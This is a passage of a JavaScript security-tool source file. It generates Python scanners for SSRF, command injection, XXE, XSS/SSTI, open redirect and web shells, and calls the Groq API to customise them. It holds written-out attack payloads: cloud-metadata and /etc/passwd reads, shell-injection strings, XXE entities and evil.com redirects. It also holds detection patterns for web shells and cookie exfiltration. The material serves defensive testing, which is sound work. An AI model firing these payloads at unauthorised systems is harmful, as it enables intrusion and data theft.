TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8
HEADERS = {"User-Agent": "BlueTeam-SSRFScanner/1.0"}

# URLs de SSRF para testar (metadata de cloud, IPs internos)
SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS IMDSv1
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/instance",           # Azure
    "http://192.168.1.1/",                                 # Router interno
    "http://10.0.0.1/",                                    # Rede privada
    "http://127.0.0.1/",                                   # Localhost
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",                                       # IPv6 localhost
    "file:///etc/passwd",                                  # LFI via SSRF
    "dict://127.0.0.1:6379/info",                         # Redis via SSRF
    "gopher://127.0.0.1:3306/",                            # MySQL via SSRF
    "ftp://127.0.0.1/",
]

# Parâmetros comuns que aceitam URLs
URL_PARAMS = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "path", "page", "file", "doc", "document",
    "resource", "load", "fetch", "image", "img", "proxy",
    "webhook", "callback", "endpoint", "api", "service",
    "host", "domain", "target", "return", "next",
]

# Endpoints que frequentemente têm SSRF
SSRF_ENDPOINTS = [
    "/api/fetch", "/api/proxy", "/api/webhook",
    "/api/preview", "/api/screenshot", "/api/render",
    "/api/import", "/api/export", "/api/upload",
    "/webhook", "/proxy", "/fetch", "/preview",
    "/api/v1/import", "/api/share",
]

def test_ssrf_param(base, param, payload):
    url = f"{base}?{param}={requests.utils.quote(payload)}"
    try:
        t0 = time.time()
        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS,
                         allow_redirects=False)
        elapsed = round((time.time() - t0) * 1000)

        # Indicadores de SSRF bem-sucedido
        aws_metadata = "ami-id" in r.text or "instance-id" in r.text or "security-credentials" in r.text
        internal_data = "root:" in r.text or "localhost" in r.text.lower()
        redirect_internal = r.status_code in [301,302,307] and any(
            ip in r.headers.get("Location","") for ip in ["169.254", "192.168", "10.0", "127.0"]
        )

        if aws_metadata:
            return {"vuln": True, "type": "AWS Metadata SSRF", "param": param, "payload": payload, "severity": "CRITICAL"}
        if internal_data:
            return {"vuln": True, "type": "Internal Data SSRF", "param": param, "payload": payload, "severity": "CRITICAL"}
        if redirect_internal:
            return {"vuln": True, "type": "Internal Redirect SSRF", "param": param, "payload": payload, "severity": "HIGH"}
        if r.status_code == 200 and elapsed < 100 and "169.254" in payload:
            return {"vuln": True, "type": "Fast response to metadata URL (possible SSRF)", "param": param}
    except Exception:
        pass
    return {"vuln": False}

def test_endpoint_ssrf(base, endpoint, payload):
    url = base.rstrip("/") + endpoint
    try:
        for field in ["url", "src", "webhook", "endpoint"]:
            r = requests.post(url, json={field: payload}, timeout=TIMEOUT,
                              verify=False, headers={**HEADERS, "Content-Type": "application/json"})
            if r.status_code == 200:
                if any(kw in r.text for kw in ["ami-id", "instance-id", "root:", "localhost"]):
                    return {"vuln": True, "type": "POST SSRF", "endpoint": endpoint, "field": field}
    except Exception:
        pass
    return {"vuln": False}

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SSRF Scanner                                    ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Testando parâmetros URL comuns...")
    for param in URL_PARAMS[:10]:
        for payload in SSRF_PAYLOADS[:6]:
            r = test_ssrf_param(base, param, payload)
            if r["vuln"]:
                all_findings.append(r)
                print(f"  🔴 SSRF em ?{param}= → {payload[:50]}")
                break

    print()
    print("[*] Testando endpoints de SSRF conhecidos...")
    for endpoint in SSRF_ENDPOINTS[:8]:
        for payload in SSRF_PAYLOADS[:4]:
            r = test_endpoint_ssrf(base, endpoint, payload)
            if r["vuln"]:
                all_findings.append(r)
                print(f"  🔴 SSRF em {endpoint}")
                break

    print()
    print("=" * 64)
    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
    print(f"  SSRF encontrados: {len(all_findings)} | Críticos: {len(criticals)}")
    if not all_findings:
        print("  ✅ Nenhum SSRF detectado nos testes realizados")
    else:
        print()
        print("  RECOMENDAÇÕES:")
        print("     • Implemente allowlist de URLs/IPs aceitos")
        print("     • Bloqueie acesso a IPs privados e metadata de cloud")
        print("     • Use IMDSv2 no AWS (requer token de sessão)")
        print("     • Valide e sanitize todos os inputs de URL")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("ssrf_scan_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: ssrf_scan_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 15. Command Injection Tester ──────────────────────────────────
  cmd_injection: {
    id: 'cmd_injection',
    name: 'Command Injection Tester',
    category: 'Injeção',
    severity: 'critical',
    description: 'Testa injeção de comandos OS em parâmetros e APIs. Detecta RCE (Remote Code Execution) via time-based e error-based.',
    icon: '💻',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Command Injection Tester                        ║
║  Propósito: Detectar RCE / Command Injection                 ║
║  Alvo: ${url}
║  Uso: python cmd_injection.py [URL]                          ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, time, requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 12
HEADERS = {"User-Agent": "BlueTeam-CMDiTest/1.0"}

# Payloads de detecção de command injection
ERROR_PAYLOADS = [
    ";id", "|id", "&&id", "\`id\`", "$(id)",
    ";whoami", "|whoami", "&&whoami",
    ";cat /etc/passwd", "|cat /etc/passwd",
    ";ls", "|ls -la", "&&ls",
    "%0aid", "%0a%0aid", "%3Bid",
    "&& sleep 0 &&", "|| true ||",
]

TIME_PAYLOADS = [
    ";sleep 3", "| sleep 3", "&& sleep 3",
    ";ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
    "\`sleep 3\`", "$(sleep 3)",
    "%0asleep+3", "%0a%0asleep+3",
    ";timeout 3 ping localhost",
]

ERROR_INDICATORS = [
    "uid=", "gid=", "groups=",            # id output
    "root:x:0:0", "/bin/bash",             # /etc/passwd
    "command not found", "Permission denied",
    "sh: ", "bash: ", "/bin/sh",
    "total ", "drwxr",                     # ls output
    "Win32_OperatingSystem",               # Windows
    "Microsoft Windows", "COMPUTERNAME",
]

COMMON_PARAMS = [
    "cmd", "exec", "command", "run", "query", "q",
    "file", "filename", "path", "host", "domain",
    "ip", "ping", "name", "id", "user", "input",
    "data", "value", "param", "arg", "action",
]

def check_error_cmdi(base, param, payload):
    url = f"{base}?{param}={requests.utils.quote(payload)}"
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
        for indicator in ERROR_INDICATORS:
            if indicator.lower() in r.text.lower():
                return {"found": True, "type": "Error-based Command Injection",
                        "param": param, "payload": payload[:40],
                        "indicator": indicator, "severity": "CRITICAL"}
    except Exception:
        pass
    return {"found": False}

def check_time_cmdi(base, param, payload, threshold=2.5):
    url = f"{base}?{param}={requests.utils.quote(payload)}"
    try:
        t0 = time.time()
        requests.get(url, timeout=TIMEOUT + 5, verify=False, headers=HEADERS)
        elapsed = time.time() - t0
        if elapsed >= threshold:
            return {"found": True, "type": "Time-based Command Injection",
                    "param": param, "payload": payload[:40],
                    "elapsed": round(elapsed, 2), "severity": "CRITICAL"}
    except Exception:
        pass
    return {"found": False}

def test_post_cmdi(base, endpoint, param, payload):
    url = base.rstrip("/") + endpoint
    try:
        r = requests.post(url, json={param: payload}, timeout=TIMEOUT,
                          verify=False, headers={**HEADERS, "Content-Type": "application/json"})
        for indicator in ERROR_INDICATORS:
            if indicator in r.text:
                return {"found": True, "type": "POST Command Injection",
                        "endpoint": endpoint, "param": param, "payload": payload[:40]}
        t0 = time.time()
        requests.post(url, json={param: ";sleep 3"}, timeout=TIMEOUT + 5,
                      verify=False, headers={**HEADERS, "Content-Type": "application/json"})
        if time.time() - t0 >= 2.5:
            return {"found": True, "type": "POST Time-based CMDi", "endpoint": endpoint}
    except Exception:
        pass
    return {"found": False}

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Command Injection Tester                        ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Testando parâmetros GET para command injection...")
    for param in COMMON_PARAMS[:12]:
        for payload in ERROR_PAYLOADS[:6]:
            r = check_error_cmdi(base, param, payload)
            if r["found"]:
                all_findings.append(r)
                print(f"  🔴 CRÍTICO! CMDi em ?{param}= → {payload}")
                break
        else:
            for payload in TIME_PAYLOADS[:3]:
                r = check_time_cmdi(base, param, payload)
                if r["found"]:
                    all_findings.append(r)
                    print(f"  🔴 Time-based CMDi em ?{param}= (delay: {r['elapsed']}s)")
                    break

    print()
    print("[*] Testando endpoints de API via POST...")
    api_endpoints = ["/api/exec", "/api/ping", "/api/run", "/api/command", "/api/shell"]
    for endpoint in api_endpoints:
        for param in ["cmd", "command", "exec", "query"]:
            r = test_post_cmdi(base, endpoint, param, ";id")
            if r["found"]:
                all_findings.append(r)
                print(f"  🔴 CMDi em POST {endpoint}.{param}")

    print()
    print("=" * 64)
    print(f"  Command Injections encontradas: {len(all_findings)}")
    if not all_findings:
        print("  ✅ Nenhuma command injection detectada")
    else:
        print()
        print("  ⚠️  ATENÇÃO: RCE detectado — prioridade máxima!")
        print("  RECOMENDAÇÕES:")
        print("     • NUNCA passe input do usuário diretamente para shell")
        print("     • Use subprocess com lista de argumentos (sem shell=True)")
        print("     • Implemente whitelist rigorosa de comandos permitidos")
        print("     • Sandbox o servidor de aplicação (Docker, chroot)")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("cmd_injection_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: cmd_injection_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 16. XXE Injection Scanner ─────────────────────────────────────
  xxe_scanner: {
    id: 'xxe_scanner',
    name: 'XXE Injection Scanner',
    category: 'Injeção',
    severity: 'high',
    description: 'Testa XML External Entity (XXE) injection em endpoints que processam XML. Detecta leitura de arquivos locais e SSRF via XXE.',
    icon: '📄',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — XXE Injection Scanner                           ║
║  Propósito: Detectar XML External Entity injection           ║
║  Alvo: ${url}
║  Uso: python xxe_scanner.py [URL]                            ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 10

XXE_PAYLOADS = [
    # LFI via XXE
    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>''',
    # SSRF via XXE
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>''',
    # Billion laughs DoS (safe — apenas 3 níveis)
    '''<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;">]><lol>&b;</lol>''',
]

LFI_INDICATORS = ["root:x:0:0", "/bin/bash", "daemon:", "nobody:", "www-data"]

XML_ENDPOINTS = [
    "/api/xml", "/api/import", "/api/upload", "/api/parse",
    "/api/v1/xml", "/api/data", "/soap", "/wsdl",
    "/api/convert", "/api/process", "/xmlrpc.php",
    "/api/feed", "/sitemap.xml",
]

CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]

def test_xxe(endpoint, payload, content_type):
    try:
        r = requests.post(endpoint, data=payload.encode(), timeout=TIMEOUT, verify=False,
                          headers={"User-Agent": "BlueTeam-XXEScanner/1.0",
                                   "Content-Type": content_type})
        for indicator in LFI_INDICATORS:
            if indicator in r.text:
                return {"vuln": True, "type": "XXE LFI", "severity": "CRITICAL",
                        "indicator": indicator, "content_type": content_type}
        if "169.254.169.254" in r.text or "ami-id" in r.text:
            return {"vuln": True, "type": "XXE SSRF (AWS Metadata)", "severity": "CRITICAL"}
        if r.status_code == 200 and len(r.text) > 50 and "<?xml" not in payload[:10]:
            return {"vuln": False, "note": f"{r.status_code} — may process XML"}
    except Exception:
        pass
    return {"vuln": False}

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — XXE Injection Scanner                           ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Testando endpoints para XXE injection...")
    for path in XML_ENDPOINTS:
        url = base + path
        for payload in XXE_PAYLOADS[:3]:
            for ctype in CONTENT_TYPES[:2]:
                r = test_xxe(url, payload, ctype)
                if r.get("vuln"):
                    all_findings.append({**r, "endpoint": path})
                    print(f"  🔴 XXE em {path} [{ctype}] — {r['type']}")
                    break

    print()
    print("=" * 64)
    print(f"  XXE encontradas: {len(all_findings)}")
    if not all_findings:
        print("  ✅ Nenhuma XXE detectada")
    else:
        print()
        print("  RECOMENDAÇÕES:")
        print("     • Desabilite DTDs externos no parser XML")
        print("     • Use parsers seguros (defusedxml em Python)")
        print("     • Valide e sanitize todo XML recebido")
        print("     • Considere JSON em vez de XML nas APIs")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("xxe_scan_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: xxe_scan_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 17. Venom Payload Detector ─────────────────────────────────────
  venom_detector: {
    id: 'venom_detector',
    name: 'Venom / Malicious Payload Detector',
    category: 'Detecção',
    severity: 'high',
    description: 'Analisa respostas HTTP em busca de payloads maliciosos, backdoors, web shells, redirectores e código ofuscado injetado.',
    icon: '🐍',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Venom / Malicious Payload Detector              ║
║  Propósito: Detectar web shells, backdoors e malware injetado║
║  Alvo: ${url}
║  Uso: python venom_detector.py [URL]                         ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, json, re, requests
from datetime import datetime
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 10
HEADERS = {"User-Agent": "BlueTeam-VenomDetector/1.0"}

# Assinaturas de web shells conhecidos
WEBSHELL_SIGNATURES = {
    "PHP web shell": [r"eval\\(base64_decode", r"system\\(\\$_(?:GET|POST|REQUEST)",
                      r"passthru\\(", r"shell_exec\\(\\$_", r"exec\\(\\$_",
                      r"<?php.*\\$_(?:GET|POST|REQUEST)\\[.*\\].*(?:eval|system|exec)",
                      r"c99shell", r"r57shell", r"phpspy"],
    "Python backdoor": [r"import socket.*exec", r"subprocess\\.Popen.*shell=True",
                        r"os\\.system\\(request", r"exec\\(request\\."],
    "JSP shell":       [r"Runtime\\.getRuntime\\(\\)\\.exec", r"<%.*request\\.getParameter.*exec"],
    "Obfuscated JS":   [r"eval\\(atob\\(", r"eval\\(unescape\\(",
                        r"String\\.fromCharCode\\([\\d,\\s]{30,}\\)",
                        r"\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}\\\\x[0-9a-f]{2}"],
    "Crypto miner":    [r"coinhive", r"cryptonight", r"monero", r"mining_key",
                        r"CoinHive\\.Anonymous", r"xmrig"],
    "Malicious iframe": [r'<iframe[^>]+src=["\\'](https?://[^"\\'>]{10,})',
                          r'<iframe.*style=["\\']*display\\s*:\\s*none'],
    "Redirect malware": [r'window\\.location\\s*=\\s*["\\'](https?://[^"\\'>]{10,})',
                          r'document\\.location\\.href\\s*=\\s*["\\'](https?://)'],
    "Data exfil":       [r'new Image.*\\.src.*(?:cookie|document\\.cookie)',
                          r'fetch.*cookie.*evil', r'navigator\\.sendBeacon.*cookie'],
}

SUSPICIOUS_FILES = [
    "/shell.php", "/cmd.php", "/backdoor.php", "/c99.php", "/r57.php",
    "/b374k.php", "/webshell.php", "/upload.php", "/eval.php",
    "/shell.aspx", "/cmd.aspx", "/backdoor.aspx",
    "/tmp/shell.php", "/uploads/shell.php",
    "/.hidden/shell.php", "/images/shell.php",
    "/js/analytics.php", "/includes/shell.php",
    "/api/shell", "/api/exec", "/api/cmd",
]

def scan_content(content, source):
    findings = []
    for shell_type, patterns in WEBSHELL_SIGNATURES.items():
        for pattern in patterns:
            try:
                if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                    findings.append({
                        "type": shell_type,
                        "source": source,
                        "pattern": pattern[:50],
                        "severity": "CRITICAL",
                    })
                    print(f"  🔴 {shell_type} detectado em {source}!")
                    break
            except Exception:
                pass
    return findings

def check_integrity(base):
    """Verifica integridade de arquivos JS/CSS principais."""
    findings = []
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False, headers=HEADERS)
        # Extrai scripts
        scripts = re.findall(r'<script[^>]+src=["\\']((?!http)[^"\\'>]+)', r.text)
        for script in scripts[:10]:
            script_url = urljoin(base, script)
            try:
                rs = requests.get(script_url, timeout=TIMEOUT, verify=False, headers=HEADERS)
                script_findings = scan_content(rs.text, script)
                findings.extend(script_findings)
            except Exception:
                pass
        # Varre página principal
        main_findings = scan_content(r.text, "index.html")
        findings.extend(main_findings)
    except Exception as e:
        findings.append({"error": str(e)[:40]})
    return findings

def check_suspicious_files(base):
    found = []
    print("[*] Procurando web shells e arquivos suspeitos...")
    for path in SUSPICIOUS_FILES:
        url = base.rstrip("/") + path
        try:
            r = requests.get(url, timeout=5, verify=False, headers=HEADERS)
            if r.status_code == 200 and len(r.text) > 10:
                found.append({"path": path, "status": r.status_code,
                               "size": len(r.text), "severity": "CRITICAL"})
                print(f"  🔴 Arquivo suspeito acessível: {path} ({len(r.text)} bytes)")
        except Exception:
            pass
    return found

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Venom / Malicious Payload Detector              ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Analisando código-fonte em busca de malware...")
    content_findings = check_integrity(base)
    all_findings.extend(content_findings)
    if not content_findings:
        print("  ✅ Nenhum payload malicioso no código-fonte principal")

    print()
    suspicious_files = check_suspicious_files(base)
    all_findings.extend(suspicious_files)
    if not suspicious_files:
        print("  ✅ Nenhum web shell encontrado")

    print()
    print("=" * 64)
    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
    print(f"  Payloads detectados: {len(all_findings)} | Críticos: {len(criticals)}")
    if not all_findings:
        print("  ✅ Nenhum malware ou web shell detectado!")
    else:
        print()
        print("  ⚠️  AÇÃO IMEDIATA NECESSÁRIA:")
        print("     • Remova arquivos suspeitos imediatamente")
        print("     • Analise logs de acesso para identificar origem")
        print("     • Audite todos os arquivos no servidor")
        print("     • Reporte ao time de segurança e ao bug bounty")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("venom_detector_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados em: venom_detector_results.json")

if __name__ == "__main__":
    main()
`
  },

  xss_scanner: {
    id: 'xss_scanner',
    name: 'XSS & Injection Scanner',
    category: 'Injeção',
    severity: 'high',
    description: 'Testa XSS refletido, SSTI (Server-Side Template Injection) e Open Redirect em parâmetros de URL e formulários.',
    icon: '💉',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — XSS & Injection Scanner                         ║
║  Propósito: Detectar XSS refletido, SSTI e open redirect     ║
║  Alvo: ${url}
║  Uso: python xss_scanner.py [URL]                            ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import json
import re
import requests
from datetime import datetime
from urllib.parse import urlencode, urlparse

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    '{{7*7}}',      # SSTI Jinja2/Twig
    '\${7*7}',      # SSTI EL/Freemarker
    '<%= 7*7 %>',   # SSTI ERB/EJS
    '#{ 7*7 }',     # SSTI Ruby
]

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\\\evil.com",
    "javascript:alert(1)",
    "https://evil.com%2F%2F",
]

COMMON_PARAMS = [
    "q", "query", "search", "s", "keyword", "term",
    "redirect", "redirect_to", "url", "next", "return",
    "returnTo", "return_to", "callback", "continue",
    "dest", "destination", "go", "target", "page",
    "error", "message", "msg", "info", "debug",
    "email", "username", "name", "id", "ref",
]

def test_xss_reflected(base):
    """Testa XSS refletido em parâmetros comuns."""
    findings = []

    for param in COMMON_PARAMS[:12]:
        for payload in XSS_PAYLOADS[:4]:
            url = f"{base}/?{param}={requests.utils.quote(payload)}"
            try:
                r = requests.get(url, timeout=TIMEOUT, verify=False,
                                 headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})

                # Verifica se payload é refletido sem escapamento
                if payload in r.text:
                    escaped_payload = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
                    if escaped_payload not in r.text:
                        findings.append({
                            "type": "XSS Refletido",
                            "param": param,
                            "payload": payload[:50],
                            "url": url[:100],
                            "severity": "ALTO",
                        })
                        print(f"  🔴 XSS em /?{param}= — payload refletido não escapado!")
                        break

                # Testa SSTI (Server-Side Template Injection)
                if payload in ["{{7*7}}", "\${7*7}", "<%= 7*7 %>"]:
                    if "49" in r.text and payload not in r.text:
                        findings.append({
                            "type": "SSTI (Template Injection)",
                            "param": param,
                            "payload": payload,
                            "evidence": "7*7=49 calculado",
                            "severity": "CRÍTICO",
                        })
                        print(f"  🔴 CRÍTICO! SSTI em /?{param}= — template executou 7*7=49!")

            except Exception:
                pass

    return findings

def test_open_redirect(base):
    """Testa open redirect em parâmetros de redirecionamento."""
    findings = []
    redirect_params = ["redirect", "redirect_to", "url", "next", "return", "returnTo", "callback", "go", "dest"]

    for param in redirect_params:
        for payload in REDIRECT_PAYLOADS[:3]:
            url = f"{base}/?{param}={requests.utils.quote(payload)}"
            try:
                r = requests.get(url, timeout=TIMEOUT, verify=False, allow_redirects=False,
                                 headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})

                if r.status_code in [301, 302, 303, 307, 308]:
                    location = r.headers.get("Location", "")
                    if "evil.com" in location:
                        findings.append({
                            "type": "Open Redirect",
                            "param": param,
                            "payload": payload,
                            "redirect_to": location,
                            "severity": "ALTO",
                        })
                        print(f"  🔴 Open Redirect em /?{param}= → {location[:60]}")
                        break
            except Exception:
                pass

    return findings

def test_header_injection(base):
    """Testa injeção via headers HTTP."""
    findings = []

    injection_headers = {
        "X-Forwarded-Host": "evil.com",
        "X-Forwarded-For": "127.0.0.1",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "Host": "evil.com",
    }

    for header, value in injection_headers.items():
        try:
            r = requests.get(base, timeout=TIMEOUT, verify=False,
                             headers={
                                 "User-Agent": "BlueTeam-SecurityTest/1.0",
                                 header: value,
                             })

            if r.status_code == 200 and "evil.com" in r.text:
                findings.append({
                    "type": "Header Injection",
                    "header": header,
                    "value": value,
                    "severity": "MÉDIO",
                })
                print(f"  ⚠️  Header injection via {header}: valor refletido na resposta")
        except Exception:
            pass

    return findings

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — XSS & Injection Scanner                         ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    print("[*] Testando XSS refletido e SSTI...")
    xss = test_xss_reflected(base)
    all_findings.extend(xss)
    if not xss:
        print("  ✅ Nenhum XSS refletido detectado nos parâmetros testados")

    print()
    print("[*] Testando Open Redirect...")
    redirects = test_open_redirect(base)
    all_findings.extend(redirects)
    if not redirects:
        print("  ✅ Nenhum Open Redirect detectado")

    print()
    print("[*] Testando injeção via headers HTTP...")
    header_inj = test_header_injection(base)
    all_findings.extend(header_inj)
    if not header_inj:
        print("  ✅ Nenhuma injeção via headers detectada")

    print()
    print("=" * 64)
    criticals = [f for f in all_findings if f["severity"] == "CRÍTICO"]
    highs     = [f for f in all_findings if f["severity"] == "ALTO"]
    print(f"  VULNERABILIDADES: {len(all_findings)} total")
    print(f"  🔴 Críticas: {len(criticals)}")
    print(f"  🟡 Altas   : {len(highs)}")

    if not all_findings:
        print("  ✅ Nenhuma vulnerabilidade de injeção detectada!")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("xss_scan_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: xss_scan_results.json")

if __name__ == "__main__":
    main()
`
  },
};

// ═══════════════════════════════════════════════════════════════════
// GROQ AI — Customiza scripts com base nos resultados da auditoria
// ═══════════════════════════════════════════════════════════════════

async function callGroq(messages, maxTokens = 2048) {
  const res = await fetch(GROQ_API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${GROQ_API_KEY}`,
    },
    body: JSON.stringify({
      model: MODEL,
      messages,
      temperature: 0.2,
      max_tokens: maxTokens,
      stream: false,
    }),
  });
  if (!res.ok) throw new Error(`Groq API ${res.status}: ${await res.text()}`);
  const data = await res.json();
  return data.choices?.[0]?.message?.content || '';
}

// Decide quais scripts são relevantes com base nos resultados da auditoria
function selectRelevantScripts(auditResults) {
  const results = auditResults || [];
  const checks = results.map(r => (r.check || '').toLowerCase());
  const failures = results.filter(r => r.status === 'FAIL' || r.status === 'WARN');
  const failChecks = failures.map(r => (r.check || '').toLowerCase());

  const selected = new Set();

  // Sempre inclui os básicos
  selected.add('headers_analyzer');
  selected.add('ssl_analyzer');
  selected.add('credential_scanner');
  selected.add('metasploit_enum');

  // Baseado em vulnerabilidades encontradas
  if (failChecks.some(c => c.includes('route') || c.includes('hidden') || c.includes('endpoint'))) selected.add('route_scanner');
  if (failChecks.some(c => c.includes('brute') || c.includes('rate') || c.includes('lockout') || c.includes('hydra'))) selected.add('hydra_bruteforce');
  if (failChecks.some(c => c.includes('brute') || c.includes('rate') || c.includes('lockout'))) selected.add('brute_force_test');
  if (failChecks.some(c => c.includes('ddos') || c.includes('dos') || c.includes('slowloris'))) selected.add('dos_test');
  if (failChecks.some(c => c.includes('xss') || c.includes('inject') || c.includes('redirect'))) selected.add('xss_scanner');
  if (failChecks.some(c => c.includes('sql') || c.includes('inject') || c.includes('query'))) selected.add('sql_injection');
  if (failChecks.some(c => c.includes('credential') || c.includes('.env') || c.includes('key') || c.includes('bundle'))) selected.add('credential_scanner');
  if (failChecks.some(c => c.includes('csrf') || c.includes('cors') || c.includes('samesite'))) selected.add('csrf_tester');
  if (failChecks.some(c => c.includes('jwt') || c.includes('token') || c.includes('auth'))) selected.add('jwt_analyzer');
  if (failChecks.some(c => c.includes('ssrf') || c.includes('redirect') || c.includes('fetch'))) selected.add('ssrf_scanner');
  if (failChecks.some(c => c.includes('command') || c.includes('exec') || c.includes('rce'))) selected.add('cmd_injection');
  if (failChecks.some(c => c.includes('xml') || c.includes('xxe') || c.includes('upload'))) selected.add('xxe_scanner');
  if (failChecks.some(c => c.includes('phishing') || c.includes('email') || c.includes('spf') || c.includes('dmarc'))) selected.add('phishing_analyzer');
  if (failChecks.some(c => c.includes('malware') || c.includes('shell') || c.includes('backdoor'))) selected.add('venom_detector');

  // Se não encontrou vulnerabilidades específicas, inclui seleção completa
  if (selected.size < 5) {
    ['route_scanner', 'hydra_bruteforce', 'sql_injection', 'jwt_analyzer', 'ssrf_scanner',
     'csrf_tester', 'cmd_injection', 'venom_detector', 'phishing_analyzer'].forEach(k => selected.add(k));
  }

  return [...selected];
}

// Usa Groq para gerar insights adicionais para cada script
async function generateScriptInsights(auditData, scriptId, scriptTemplate) {
  const { projectUrl, results = [], score } = auditData;

  const relevantFindings = results
    .filter(r => r.status !== 'PASS')
    .slice(0, 8)
